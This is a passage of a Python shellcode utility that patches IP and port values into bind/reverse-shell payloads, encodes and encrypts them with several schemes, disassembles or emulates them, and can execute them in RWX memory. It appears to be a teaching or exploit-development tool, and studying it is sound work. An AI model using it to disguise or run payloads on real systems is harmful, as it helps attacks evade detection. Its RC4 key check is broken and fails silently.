		# [!] Need to find a better way
		match = re.match(regex, shellcode)
		if (match) and (match.end() == len(shellcode)):
			return shellcode
		else:
			raise Error
	except Error:
		msg = "[!] Unrecognized Shellcode input!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
#----------------------------------------------------------------------------	

#----------------------------------------------------------------------------
""" Verify that the IPv4 address is valid and it does not contain nulls """
def verify_serveraddress(ip):
	try:
		# Convert IP address into hex
		hexaddr = ipaddress.IPv4Address(ip).packed 
		# Remove the byte formatter and the '\x's
		hexaddr = str(hexaddr)[2:18]
		hexaddr = str.replace(hexaddr, "\\x", '')
		# Ensure that it does not contain null bytes
		if ('00' in hexaddr):
			raise NullByte
		else:
			return hexaddr
	except NullByte:
		msg = "[!] Your specified IP address contains null byte(s)!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
	except ValueError:
		msg = "[!] That's not a valid IPv4 address!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Verify that the port number is valid and it does not contain nulls """
def verify_portnumber(port):
	# A try-exception loop to get the user supplied port number
	try:
		# Cast into integer
		port = int(port)
		# If the supplied port is out of bounds
		if (port > 65535) or (port < 1):				
			raise PortNumber
		# If the supplied port number is not out of bounds
		if (port >= 1 ) and (port <= 65535):
			# Remind the user about the privileges of using the supplied port
			if ((port < 1024) and (os.getuid() != 0)):
				msg = "\n[!] Reminder: You'll need root privileges to use this port with a bind shell!"
				print(Bcolors.WARNING + msg + Bcolors.ENDC)
			# Convert from decimal to hex, ignore '0x', keep only the bytes
			hexport = hex(port)[2:]
			# Zero padding
			while (len(hexport) < 4):
				hexport = '0' + hexport
			# If the hex representation of the port number contains nulls
			if ('00' in hexport):
				raise NullByte
			else:
				return hexport
	except PortNumber:
		msg = "[!] A port number is a 16-bit unsigned integer, thus ranging from 1 to 65535!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
	except NullByte:
		msg = "[!] Your specified port contains null byte(s)!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
	except ValueError:
		msg = "[!] That's not a valid port number!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Verify that the user supplied xor key is 1 byte long """
def verify_xor(key):
	try:
		# If the supplied key is between 0x1 and 0xFF
		# XORing with 0xFF is equivalent to the NOT operation
		if (int(key) >= 1) and (int(key) <= 255):
			return int(key)
		else:
			raise OutofBounds
	except OutofBounds:
		msg = "[!] The decimal number must be between 1 (0x1) and 255 (0xff)!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
	except ValueError:
		msg = "[!] That's not a valid number!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Verify that the user supplied add/sub key is 1 byte long """
def verify_add_sub(key):
	try:
		# If the supplied key is between 0x1 and 0xFE
		# But why don't allow 0xff? 0xff + 0xff = 0x1fe 
		# However, we add the carry back, 0x1fe --> 0xff
		# so it results the same number every time
		if (int(key) >= 1) and (int(key) < 255):
			return int(key)
		else:
			raise OutofBounds
	except OutofBounds:
		msg = "[!] The decimal number must be between 1 (0x1) and 254 (0xfe)!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
	except ValueError:
		msg = "[!] That's not a valid number!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Verify that the number of rotations to perform is valid """
def verify_rot(rot_n):
	try:
		# If the rotation value is valid
		# ROT-256 yields the same number
		if (int(rot_n) >= 1) and (int(rot_n) < 256):
			return int(rot_n)
		else:
			raise OutofBounds
	except OutofBounds:
		msg = "[!] The ROT number must be between 1 and 255!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
	except ValueError:
		msg = ("[!] That's not a valid number!")
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Verify that the number of bits to shift, left or right, is valid """
def verify_rox(rox_bits):
	try:
		# If the user supplied bits for shift rotation is between bounds
		# We're dealing with single byte numbers so 8 bits is the max
		if (int(rox_bits) >= 1) and (int(rox_bits) <= 8):
			return int(rox_bits)
		else:
			raise OutofBounds
	except OutofBounds:
		msg = "[!] The shitft bits number must be between 1 and 8!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
	except ValueError:
		msg = "[!] That's not a valid number!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Verify that the user supplied key for the insertion encoder is 1 byte """
def verify_ins(key):
	try:
		# If --ins is used just as a flag
		if key == 'random':
			return key
		# If the supplied key is between 0x1 and 0xFF
		if (int(key) >= 1) and (int(key) <= 255):
			return int(key)
		else:
			raise OutofBounds
	except OutofBounds:
		msg = "[!] The decimal number must be between 1 (0x1) and 255 (0xff)!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
	except ValueError:
		msg = "[!] That's not a valid number!"
		raise argparse.ArgumentTypeError(Bcolors.WARNING + msg + Bcolors.ENDC)
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Verify that the user supplied RC4 encryption key is valid """
def verify_rc4(key):
	try:
		# The rc4 encryption key should not consist of more than 256 chars
		if (len(key) >= 1) and (len(key) <= 256):
			return key
		else:
			raise OutofBounds
	except OutofBounds:
		msg = "[!] The key should consist of <= 256 characters!"
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Set the filename for the CFG """
def set_cfg_filename(sctest):
	# Whitelist approach for the given graph filename to remove unwanted 
	# filename characters
	valid_chars = "-_.()%s%s" % (string.ascii_letters, string.digits)
	sctest = ''.join(char for char in sctest if char in valid_chars)
	return sctest
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Execute Shellcode """
def execute_shellcode(payload):
		# Create a buffer containing the payload
		payload = create_string_buffer(payload)
		# CFUNCTYPE()  he returned function prototype creates functions that
		# use the standard C calling convention
		# cast() Return a new instance of type CFUNCTYPE(none) which points
		# to the payload buffer
		execute = cast(payload, CFUNCTYPE(None))
		# cast() to return a new instance of type c_void_p
		# Access as a NULL terminated string using the value property
		address = cast(execute, c_void_p).value
		# Load the library by creating an instance of CDLL by calling the 
		# constructor 
		libc = CDLL('libc.so.6')
		# Get the pagesize, the number of bytes of a single page in memory
		pagesize = libc.getpagesize()
		addr_page = (address // pagesize) * pagesize
		for page_start in range(addr_page, address + len(payload), pagesize):
			assert libc.mprotect(page_start, pagesize, 0x7) == 0
		execute()
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" The displayed help message """
def msg(name=None): 
	message = '''shellcodeit.py\t(--file | --shellcode) 
	\t\t\t[--ip] [--port]
	\t\t\t[--xor | --add | --sub | --rot | --rol | --ror | --ins]
	\t\t\t[--rc4 | --aes | --aesdec | --blowfish | --blowfishdec]
	\t\t\t[--libemu | ndisasm] 
	\t\t\t[--nasm]
	\nPositional:
	--file\t\t.nasm/.asm file of the x86 Assembly code
	--shellcode\traw hexademical shellcode
	\nWrappers:
	--ip\t\tipv4 address for bind/reverse payloads
	--port\t\tport number for bind/reverse payloads
	\nEncoders:
	--xor\t\tsingle byte xor encoding key
	--add\t\tsingle byte add encoding key
	--sub\t\tsingle byte sub encoding key
	--rot\t\tcaesar's cipher rotations
	--rol\t\tshift left rotation bits
	--ror\t\tshift right rotation bits
	--ins\t\tsingle byte insertion encoding key
	\nCrypters:
	--rc4\t\trivest cipher 4 encryption key
	--aes\t\taes-256 encryption key
	--aesdec\taes-256 decryption key
	--blowfish\tblowfish encryption key
	--blowfishdec\tblowfish decryption key
	\nAnalysis:
	--libemu\tgetPC heuristics and cfg generation
	--ndisasm\tdisassemble shellcode using ndisasm
	\nMiscellaneous
	--nasm\t\tnasm formatted shellcode
	--exec\t\texecute the generated shellcode
	'''
	return message
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Everything related to the command line arguments """
# Is this the worst parsing in the history of Python?
def arguments():
	parser = ArgumentParser(usage=msg())
	subparsers = parser.add_subparsers(help='sub-command help')
	""" .nasm/.asm/shellcode """
	groupA = parser.add_mutually_exclusive_group(required=True)
	groupA.add_argument('--file', help=argparse.SUPPRESS, action='store', dest='file', type=verify_file)
	groupA.add_argument('--shellcode', help=argparse.SUPPRESS, action='store', type=verify_shellcode)
	""" Network preferences """
	parser.add_argument('--ip', help=argparse.SUPPRESS, action='store', dest='ip', nargs='?', const = '127.1.1.1', type=verify_serveraddress)
	parser.add_argument('--port', help=argparse.SUPPRESS, action='store', dest='port', nargs='?', const = '4444', type=verify_portnumber)
	""" Encoding preferences """
	groupB = parser.add_mutually_exclusive_group()
	groupB.add_argument('--xor', help=argparse.SUPPRESS, action='store', dest='xor_key', type=verify_xor)
	groupB.add_argument('--add', help=argparse.SUPPRESS, action='store', dest='add_key', type=verify_add_sub)
	groupB.add_argument('--sub', help=argparse.SUPPRESS, action='store', dest='sub_key', type=verify_add_sub)
	groupB.add_argument('--rot', help=argparse.SUPPRESS, action='store', dest='rot_n', nargs='?', const=13, type=verify_rot)
	groupB.add_argument('--rol', help=argparse.SUPPRESS, action='store', dest='rol_bits', nargs='?', const=1, type=verify_rox)
	groupB.add_argument('--ror', help=argparse.SUPPRESS, action='store', dest='ror_bits', nargs='?', const=1, type=verify_rox)
	groupB.add_argument('--ins', help=argparse.SUPPRESS, dest='ins_key', nargs='?', const='random', type=verify_ins)
	""" Encryption preferences """
	groupC = parser.add_mutually_exclusive_group()
	groupC.add_argument('--rc4', help=argparse.SUPPRESS, action='store', dest='rc4_key', type=verify_rc4)
	groupC.add_argument('--aes', help=argparse.SUPPRESS, action='store', dest='aes_key')
	groupC.add_argument('--aesdec', help=argparse.SUPPRESS, action='store', dest='aes_dec_key')
	groupC.add_argument('--blowfish', help=argparse.SUPPRESS, action='store', dest='blowfish_key')
	groupC.add_argument('--blowfishdec', help=argparse.SUPPRESS, action='store', dest='blowfish_dec_key')
	groupC.add_argument('--des', help=argparse.SUPPRESS, action='store', dest='des_key')
	groupC.add_argument('--desdec', help=argparse.SUPPRESS, action='store', dest='des_dec_key')
	""" Analysis preferences """
	groupD = parser.add_mutually_exclusive_group()
	groupD.add_argument('--ndisasm', help=argparse.SUPPRESS, action='store_true', dest='ndisasm')
	groupD.add_argument('--libemu', help=argparse.SUPPRESS, action='store', dest='libemu', nargs = '?', const='sctest_cfg', type=set_cfg_filename)
	""" Ouput preference """
	parser.add_argument('--nasm', help=argparse.SUPPRESS, action='store_true', dest='nasm')
	""" Shellcode Execution """
	parser.add_argument('--exec', help=argparse.SUPPRESS, action='store_true', dest='exec')
	""" Minimum Command Line Arguments """
	if len(sys.argv) < 2:
		parser.print_help()
		sys.exit(1)
	# Get the arguments
	args = parser.parse_args()
	""" Check the requirements """
	if args.file:
		if not requirements:
			req = "[!] Ensure that nasm, ld and objdump are installed to use this option!"
			print(Bcolors.FAIL + req + Bcolors.ENDC)
			sys.exit(1)
	if args.aes_key or args.aes_dec_key or args.blowfish_key or args.blowfish_dec_key:
		if not crypto_check:
			req = "[!] Ensure that Crypto.Cipher or PyCryptodome library are installed to use this option!"
			print(Bcolors.FAIL + req + Bcolors.ENDC)
			sys.exit(1)
	if args.libemu:
		if not libemu_check:
			req = "[!] Ensure that Libemu and Pylibemu are installed to use this option!"
			print(Bcolors.FAIL + req + Bcolors.ENDC)
			sys.exit(1)
	if args.des_key or args.des_dec_key:
		if not python36_check:
			req = "[!] Ensure that Python3.6 is being used for this option!"
			print(Bcolors.FAIL + req + Bcolors.ENDC)
			sys.exit(1)
	# Return the arguments
	return args	
#----------------------------------------------------------------------------

#----------------------------------------------------------------------------
""" Main Function """
def main():
	""" Store the arguments """
	args = arguments()
	if args.file:
		""" Handle the .nasm/.asm file """
		file = File(file = args.file, hexaddr = args.ip, hexport = args.port)
		file.assemble()
		file.objdump()
		payload = file.payload
		shellcode = file.shellcode
		length = file.length
	else:
		""" Handle the supplied shellcode """	
		input_shellcode = Shellcode(shellcode = args.shellcode)
		payload = input_shellcode.payload
		shellcode = input_shellcode.shellcode
		length = input_shellcode.length
		
	""" Encode the shellcode with the supplied encoding scheme """
	encoded = EncodedShellcode(payload, shellcode)
	if args.xor_key:
		# Call the xor_encode() function
		encoded.xor_encode(xor_key = args.xor_key)
		payload = encoded.encoded_payload
	elif args.add_key:
		# Call the add_encode payload
		encoded.add_encode(add_key = args.add_key)
		payload = encoded.encoded_payload
	elif args.sub_key:
		# Call the sub_encode payload
		encoded.sub_encode(sub_key = args.sub_key)
		payload = encoded.encoded_payload
	elif args.rot_n:
		# Call the rot_encode() function
		encoded.rot_encode(rot_n = args.rot_n)
		payload = encoded.encoded_payload
	elif args.rol_bits:
		# Call the rol_encode() function
		encoded.rol_encode(rol_bits = args.rol_bits)
		payload = encoded.encoded_payload
	elif args.ror_bits:
		# Call the ror_encode() function
		encoded.ror_encode(ror_bits = args.ror_bits)
		payload = encoded.encoded_payload
	elif args.ins_key:
		# Call the insertion_encode() function
		encoded.insertion_encode(ins_key = args.ins_key)
		payload = encoded.encoded_payload

	""" Encrypt the shellcode with the supplied encryption scheme """
	encrypted = EncryptedShellcode(payload, shellcode)
	if args.rc4_key:
		encrypted.rc4_encrypt(rc4_key = args.rc4_key)
		payload = encrypted.encrypted_payload
	elif args.aes_key:
		encrypted.aes256_encrypt(aes_key = args.aes_key)
		payload = encrypted.encrypted_payload
	elif args.aes_dec_key:
		encrypted.aes256_decrypt(aes_dec_key = args.aes_dec_key)
		payload = encrypted.encrypted_payload
	elif args.blowfish_key:
		encrypted.blowfish_encrypt(blowfish_key = args.blowfish_key)
		payload = encrypted.encrypted_payload
	elif args.blowfish_dec_key:
		encrypted.blowfish_decrypt(blowfish_dec_key = args.blowfish_dec_key)
		payload = encrypted.encrypted_payload
	elif args.des_key:
		encrypted.des_encrypt(des_key = args.des_key)
		payload = encrypted.encrypted_payload
	elif args.des_dec_key:
		encrypted.des_decrypt(des_dec_key = args.des_dec_key)
		payload = encrypted.encrypted_payload
	
	""" Shellcode Analysis using Libemu or Ndisasm """
	analysis = Analysis(payload, shellcode)
	if args.ndisasm:
		# Call the ndisasm() function
		analysis.ndisasm()
	elif args.libemu:
		# Call the libemu() function
		analysis.libemu(args.libemu)
		
	""" Call the printer function to print the results """
	printer(shellcode, length, encoded, encrypted, analysis, args.nasm)

	""" Shellcode Execution """
	if args.exec:
		execute_shellcode(payload)

#----------------------------------------------------------------------------

# Call Main Function
if __name__== "__main__":
	main()